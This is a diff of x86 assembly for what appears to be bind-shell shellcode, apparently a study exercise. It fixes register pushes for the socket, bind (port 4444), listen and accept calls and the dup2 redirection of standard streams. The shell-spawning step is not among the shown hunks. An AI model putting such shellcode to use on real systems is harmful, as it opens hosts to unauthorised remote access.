@@ -27,8 +27,8 @@ _start:
                ; moving into al instead of eax because the extra 0x00 bytes would
                ; be included in the shellcode (see screenshot)
   mov bl, 0x1
-  push cl      ; we can't have 0x00 in the shellcode, but we know ecx=0
-  push bl      ; because 1 is already in bl
+  push ecx      ; we can't have 0x00 in the shellcode, but we know ecx=0
+  push ebx      ; because 1 is already in bl
   push 2
 
   mov ecx, esp
@@ -53,7 +53,7 @@ _start:
   ;int 0x80
 
   mov edi, eax ; im going to mov it into edi instead, so i can keep 0 in edx
-  push dl
+  push edx
   push word 0x5C11
   push word 0x2
   mov ecx, esp
@@ -75,7 +75,7 @@ _start:
   ;mov eax, 102; syscall #
   ;int 0x80
 
-  push dl
+  push edx
   push edi
   mov ecx, esp
   mov bl, 0x4
@@ -93,8 +93,8 @@ _start:
 
   ;int 0x80 ; file descriptor is saved in eax
 
-  push dl
-  push dl
+  push edx
+  push edx
   push edi
 
   mov ecx, esp
@@ -121,10 +121,12 @@ _start:
   ;mov ecx, 0 <-- don't need this because it's already 0
   mov al, 0x3F
   int 0x80
-
+  
+  mov al, 0x3F
   inc cl ; now its 1; stderr
   int 0x80
 
+  mov al, 0x3F
   inc cl
   int 0x80
 
